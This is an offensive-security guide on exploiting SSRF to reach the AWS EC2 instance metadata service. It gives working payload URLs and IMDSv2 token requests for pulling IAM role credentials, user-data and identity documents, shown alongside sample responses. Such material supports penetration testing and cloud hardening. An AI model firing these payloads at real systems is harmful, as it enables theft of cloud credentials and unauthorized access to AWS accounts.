---
title: Exploit EC2 Instance Metadata via SSRF
description: Learn to exploit AWS EC2 instance metadata through SSRF, extract credentials,
  and understand IMDS security.
keywords:
  - "EC2 Instance Metadata"
  - "SSRF Exploitation"
  - "AWS Security"
  - "IMDSv1 vs IMDSv2"
  - "IAM Role Credentials"
  - "AWS Privilege Escalation"
  - "Cloud Metadata"
  - "Metadata Service"
  - "AWS Exploit Techniques"
---

# EC2 Instance Metadata

## Context

EC2 Instance Metadata is a critical resource for offensive operators who aim to exploit SSRF (Server-Side Request Forgery) vulnerabilities within AWS environments. By understanding how to utilize EC2 instance metadata, attackers can gain valuable insights and credentials, enabling potential privilege escalation within Amazon Web Services. This guide assumes familiarity with HTTP protocol fundamentals, cloud service architecture, metadata service concepts, and SSRF exploitation techniques.

## Theory

### AWS EC2 Instance Metadata Service (IMDS) Overview

The EC2 Instance Metadata Service (IMDS) provides instance-specific data to virtual machines (VMs) running on AWS. Located at the IP address 169.254.169.254, the service allows applications running on EC2 instances to query and retrieve metadata using HTTP GET requests. This metadata includes sensitive information such as IAM role credentials, user-data, and instance identity documents.

### IMDSv1 vs IMDSv2 Security Mechanisms

IMDSv1 allows unauthenticated HTTP requests, making it vulnerable to basic SSRF attacks. In response to these vulnerabilities, AWS introduced IMDSv2, which requires requests to include a valid session token obtained via a PUT request. While IMDSv2 mitigates some risks by requiring token authentication, the tokens are typically short-lived and must be included in subsequent requests.

### Sensitive Metadata Endpoints

Several metadata endpoints are especially valuable for attackers:

- `/latest/meta-data/iam/security-credentials/`: This endpoint exposes temporary AWS credentials associated with the instance's IAM role.
- `/latest/user-data/`: This may contain bootstrap scripts, secrets, or configuration data.
- `/latest/dynamic/instance-identity/document`: Provides instance identity and region information, which could be useful for further exploitation.

### Attacker Goals and Threat Surface

The primary goal of attackers is to exploit SSRF vulnerabilities to access EC2 instance metadata, extract AWS credentials, and use those credentials for unauthorized API access within the AWS environment. Successful exploitation may lead to privilege escalation, especially if the instance's IAM role possesses broad permissions.

### IPv6 and Alternate Metadata Endpoints

If enabled, IMDS can also be accessed via an IPv6 endpoint at fd00:ec2::254. This can provide an alternate path in environments supporting IPv6.

## Practice

### Exploiting SSRF to Access EC2 Instance Metadata (IMDSv1)

In this scenario, the attacker utilizes a vulnerable application capable of SSRF to interact with the IMDSv1 service.

- **Payload:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  - Submit the payload via the SSRF-vulnerable parameter or header to target the IAM credentials endpoint.
  
- **Response:** 
  ```
  admin-role
  ```
  - The response returns the name of the IAM role assigned to the instance.

- **Payload:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role`
  - This request fetches the temporary AWS credentials for the specified role.

- **Response:** 
  ```
  {
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYzEXAMPLEKEY",
    "Token": "IQoJb3JpZ2luX2VjE...",
    "Expiration": "2024-06-30T12:34:56Z"
  }
  ```
  - Extract AWS credentials for further exploitation.

### Bypassing IMDSv2 Token Requirement via SSRF

This scenario involves bypassing IMDSv2 token requirements by leveraging SSRF vectors that support custom HTTP methods and headers.

- **Payload:** 
  ```
  PUT http://169.254.169.254/latest/api/token
  X-aws-ec2-metadata-token-ttl-seconds: 21600
  ```
  - Request a session token from IMDSv2 by relaying the PUT request via SSRF-capable vectors.

- **Response:** 
  ```
  AQAEb...<token>
  ```
  - IMDSv2 returns a session token.

- **Payload:** 
  ```
  GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
  X-aws-ec2-metadata-token: AQAEb...<token>
  ```
  - Use the token to authenticate and access the metadata.

- **Response:** 
  ```
  admin-role
  ```
  - Retrieve the IAM role name, similar to IMDSv1 access.

### Accessing User-Data and Instance Identity Document

Using SSRF, attackers can also access other sensitive metadata endpoints:

- **User-Data Endpoint:** `http://169.254.169.254/latest/user-data/`
  - Access scripts or configurations potentially containing secrets.
  
- **Instance Identity Document:** `http://169.254.169.254/latest/dynamic/instance-identity/document`
  - Retrieve the document for instance identity and region data.

## Tools

- **curl**
- **awscli**
- **Burp Suite**